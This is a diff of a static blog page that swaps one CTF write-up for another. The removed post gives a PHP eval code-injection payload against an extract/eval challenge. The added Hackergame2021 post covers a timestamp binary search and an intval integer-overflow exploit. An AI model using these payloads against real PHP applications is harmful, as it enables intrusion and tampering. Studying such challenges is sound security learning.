@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>DAS X 吉林工师 - 1__/\/のblog</title>
+  <title>Hackergame2021 - 1__/\/のblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -164,12 +164,12 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/00110.jpg') no-repeat center center;
+         style="background: url('/img/00120.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="DAS X 吉林工师">
+            <span class="h2" id="subtitle" title="Hackergame2021">
               
             </span>
 
@@ -179,8 +179,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-29 23:25" pubdate>
-        2021年10月29日 晚上
+      <time datetime="2021-11-07 15:12" pubdate>
+        2021年11月7日 下午
       </time>
     </span>
   
@@ -191,7 +191,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      132 字
+      487 字
     </span>
   
 
@@ -201,7 +201,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      15
        分钟
     </span>
   
@@ -235,43 +235,79 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">DAS X 吉林工师</h1>
+            <h1 style="display: none">Hackergame2021</h1>
             
             <div class="markdown-body">
-              <h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);
-
-extract($_GET);
-error_reporting(<span class="hljs-number">0</span>);
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span>
+              <h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png" srcset="/img/loading.gif"></p>
+<p><code>unix时间戳</code><br>点next后url会加上<code>page=1</code>,时间就会加一秒</p>
+<p>时间戳网站<code>https://tool.chinaz.com/tools/unixtime.aspx</code></p>
+<p>也可以用二分法</p>
+<div class="hljs"><pre><code>测试 100000000000，太大 =&gt; (100000000000 + 0) / 2 = 50000000000
+测试 50000000000，太大 =&gt; (50000000000 + 0) / 2 = 25000000000
+测试 25000000000，太大 =&gt; (25000000000 + 0) / 2 = 12500000000
+测试 12500000000，太大 =&gt; (12500000000 + 0) / 2 = 6250000000
+测试 6250000000，太大 =&gt; (6250000000 + 0) / 2 = 3125000000
+测试 3125000000，太大 =&gt; (3125000000 + 0) / 2 = 1562500000
+测试 1562500000，太小（2019 年）=&gt; (1562500000 + 3125000000) / 2 = 2343750000
+测试 2343750000，太大 =&gt; (1562500000 + 2343750000) / 2 = 1953125000
+测试 1953125000，太大 =&gt; (1562500000 + 1953125000) / 2 = 1757812500
+测试 1757812500，太大（2025 年）=&gt; (1562500000 + 1757812500) / 2 = 1660156250
+测试 1660156250，太大（2022 年）=&gt; (1562500000 + 1660156250) / 2 = 1611328125
+测试 1611328125，太小（2021 年 1 月）=&gt; (1611328125 + 1660156250) / 2 = 1635742187
+测试 1635742187，太大（2021 年 11 月）=&gt; (1611328125 + 1635742187) / 2 = 1623535156
+测试 1623535156，太小（2021 年 6 月）=&gt; (1623535156 + 1635742187) / 2 = 1629638671
+测试 1629638671，太小（2021 年 8 月）=&gt; (1629638671 + 1635742187) / 2 = 1632690429
+测试 1632690429，太小（2021 年 9 月）=&gt; (1632690429 + 1635742187) / 2 = 1634216308
+测试 1634216308，太小（2021 年 10 月 14 日）=&gt; (1634216308 + 1635742187) / 2 = 1634979247
+1634979247 得到答案（2021-10-23 16:54:07 +08:00）</code></pre></div>
+<h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/8d62245630118b5c.png" srcset="/img/loading.gif"><br>显然，69是组合不出20的</p>
+<p>需要猜测源码，<code>intval</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>
 <span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();
-    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);
-    <span class="hljs-keyword">return</span> $array;
-&#125;
+    check_last_action();
+    $bottle_6 = intval($_POST[<span class="hljs-string">&#x27;b6&#x27;</span>]);
+    $bottle_9 = intval($_POST[<span class="hljs-string">&#x27;b9&#x27;</span>]);
+    <span class="hljs-keyword">if</span> ($bottle_6 &lt; <span class="hljs-number">0</span> || $bottle_9 &lt; <span class="hljs-number">0</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;操作无效：不能放负数个瓜。点击&lt;a href=&quot;/&quot;&gt;这里&lt;/a&gt;回到主页。&#x27;</span>);
+    &#125;
+    $_SESSION[<span class="hljs-string">&#x27;pool&#x27;</span>] += intval($bottle_6 * <span class="hljs-number">6</span> + $bottle_9 * <span class="hljs-number">9</span>);
+    header(<span class="hljs-string">&#x27;Location: /&#x27;</span>);
+&#125;</code></pre></div>
 
+<p><code>整数溢出会变为float,然后再用intval后，就会变成负数</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> PHP_INT_MAX;   <span class="hljs-comment">//9223372036854775807</span>
+$a=<span class="hljs-number">9223372036854775807</span>;
+$b=<span class="hljs-number">9223372036854775808</span>;
+$ia=intval($a);
+$ib=intval($b);
+var_dump($a);   <span class="hljs-comment">//int(9223372036854775807)</span>
+var_dump($b);   <span class="hljs-comment">//float(9.2233720368548E+18)</span>
+var_dump($ia);  <span class="hljs-comment">// int(9223372036854775807)</span>
+var_dump($ib);  <span class="hljs-comment">//int(-9223372036854775808)</span></code></pre></div>
 
-<span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))
-&#123;
-        $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;
-        $attrids = count($attrid);
-        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)
-        &#123;
-            $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;
-            <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)
-            &#123;
-                $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;
-            &#125;
-        &#125;
-        $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;
-&#125;
+<div class="hljs"><pre><code>1024819115206086200 * 9 = 9223372036854775800
+1024819115206086201 * 9 = 9223372036854775809</code></pre></div>
+<div class="hljs"><pre><code class="hljs php">$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;
+$ib = intval($b); <span class="hljs-comment">// int(-9223372036854775808)</span>
+$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;
+$ib += intval($b); <span class="hljs-comment">// int(-8)</span>
+$b = <span class="hljs-number">1</span> * <span class="hljs-number">9</span>;
+$ib += intval($b); <span class="hljs-comment">// int(1)</span>
+$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;
+$ib += intval($b); <span class="hljs-comment">// int(-9223372036854775807)</span>
+$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;
+$ib += intval($b); <span class="hljs-comment">// int(-7)</span>
+$b = <span class="hljs-number">3</span> * <span class="hljs-number">9</span>;
+$ib += intval($b); <span class="hljs-comment">// int(20)</span></code></pre></div>
 
-String2Array($attrstr);</code></pre></div>
-
-<p>突破点在<code>attrvalue</code>上</p>
-<p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p>
-<p>flag在<code>phpinfo()</code>中</p>
-<p>通过闭合双引号让<code>eval</code>执行命令</p>
+<p>操作六次</p>
+<div class="hljs"><pre><code>1024819115206086201 * 9
+1024819115206086200 * 9
+1 * 9
+1024819115206086201 * 9
+1024819115206086200 * 9
+3 * 9</code></pre></div>
+<p>其他两道<br>一道GraphQL，还有一道js逆向分析，不懂<br><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2021-writeups">https://github.com/USTC-Hackergame/hackergame2021-writeups</a></p>
 
             </div>
             <hr>
@@ -283,8 +319,6 @@ String2Array($attrstr);</code></pre></div>
                     
                       <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                     
-                      <a class="hover-with-bg" href="/categories/CTF/php/">php</a>
-                    
                   </div>
                 
                 
@@ -294,8 +328,6 @@ String2Array($attrstr);</code></pre></div>
                       <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                     
                       <a class="hover-with-bg" href="/tags/WP/">WP</a>
-                    
-                      <a class="hover-with-bg" href="/tags/php/">php</a>
                     
                   </div>
                 
@@ -308,18 +340,12 @@ String2Array($attrstr);</code></pre></div>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/07/hackergame2021/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Hackergame2021</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">
-                        <span class="hidden-mobile">鹤城杯</span>
+                      <a href="/2021/10/29/DAS/">
+                        <span class="hidden-mobile">DAS X 吉林工师</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
